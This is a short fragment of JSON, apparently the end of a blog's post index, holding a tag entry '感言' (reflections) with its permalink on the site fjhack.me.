:)","tags":[{"name":"感言","slug":"感言","permalink":"http://fjhack.me/tags/感言/"}]}]